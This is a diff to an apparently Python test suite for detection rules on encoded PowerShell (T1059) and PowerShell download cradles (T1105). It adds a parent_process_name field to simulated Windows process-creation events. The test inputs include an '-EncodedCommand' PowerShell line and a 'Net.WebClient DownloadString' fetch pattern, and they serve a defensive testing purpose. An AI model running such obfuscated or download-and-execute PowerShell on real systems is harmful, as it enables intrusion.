@@ -56,6 +56,7 @@ async def test_t1059_encoded_fires_on_real_payload() -> None:
         _event(
             "windows.security.4688",
             pid=4321,
+            parent_process_name="powershell.exe",
             command_line=(
                 "powershell.exe -EncodedCommand "
                 "ZQBjAGgAbwAgACIAdABlAHMAdAAiAA=="
@@ -78,6 +79,7 @@ async def test_t1059_encoded_does_not_fire_on_plain_powershell() -> None:
         _event(
             "windows.security.4688",
             pid=4321,
+            parent_process_name="powershell.exe",
             command_line="powershell.exe -File C:\\script.ps1",
         )
     )
@@ -98,6 +100,7 @@ async def test_t1105_downloadstring_fires() -> None:
         _event(
             "windows.security.4688",
             pid=5555,
+            parent_process_name="powershell.exe",
             command_line=(
                 "powershell.exe (New-Object "
                 "Net.WebClient).DownloadString("
@@ -119,6 +122,7 @@ async def test_t1105_does_not_fire_on_office_app() -> None:
         _event(
             "windows.security.4688",
             pid=5555,
+            parent_process_name="WINWORD.EXE",
             command_line="WINWORD.EXE /n C:\\file.docx",
         )
     )
